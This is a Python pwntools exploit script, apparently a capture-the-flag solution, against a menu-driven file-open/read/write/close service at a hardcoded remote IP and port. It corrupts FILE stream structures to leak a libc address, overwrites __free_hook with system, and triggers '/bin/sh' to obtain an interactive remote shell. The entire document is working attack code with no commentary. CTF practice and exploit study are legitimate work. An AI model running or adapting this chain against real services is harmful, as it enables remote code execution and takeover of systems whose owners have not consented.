#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.13"
port = 2345
host = "52.198.183.186"
port = 50216
r = remote(host,port)

def openfile(name):
    r.recvuntil("choice:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)

def readfile(idx,size):
    r.recvuntil("choice:")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))

def writefile(idx):
    r.recvuntil("choice:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def closefile(idx):
    r.recvuntil("choice:")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def escp64(data):
    result = ""
    for c in p64(data) :
        result += "\x16" + c
    return result

context.arch = "amd64"
openfile("/dev/stdin") 
openfile("/dev/null")
openfile("/dev/null")
payload = flat([0,0,0,0x24c1])
readfile(0,len(payload)+1) 
r.sendline(payload)
closefile(1)
openfile("orangendg")
payload = p64(0)*3 + p64(0x101116) + "\x00" + "\x00"*0x220
payload += flat([0,0x231,0xfbad3c80,0,0,0,0,0,0,0,0,0,0,0,0,0,1])
readfile(0,len(payload))

r.sendline(payload)
openfile("noggnogg")
payload =  p64(0)*3 + p64(0x101116)  + "\x00" + "\x00"*0x220
payload += flat([0,0x231,0xfbad3c80 | 0x800 | 0x200,0,0,0])
readfile(0,len(payload)-1)
r.sendline(payload)
openfile("hhqq")
libc =  u64(r.recvuntil("Can't open file hhqq").split("Can't")[1][-16:-8]) - 0x3bdec0
print "libc:",hex(libc)
openfile("/dev/stdin")
readfile(0,1)

free_hook = libc + 0x3c3788
system = libc + 0x456a0
payload = "\x00"*0x880 + p64(0) + p64(0x231) + p64(0)*7 + escp64(free_hook-0x10) + escp64(free_hook+0x20)
readfile(0,len(payload)-0x10)
r.sendline(payload)

payload = "/bin/sh\x00" + "a"*0x8 + escp64(system)
readfile(1,len(payload)-0x8)
r.sendline(payload)
closefile(1)
r.interactive()
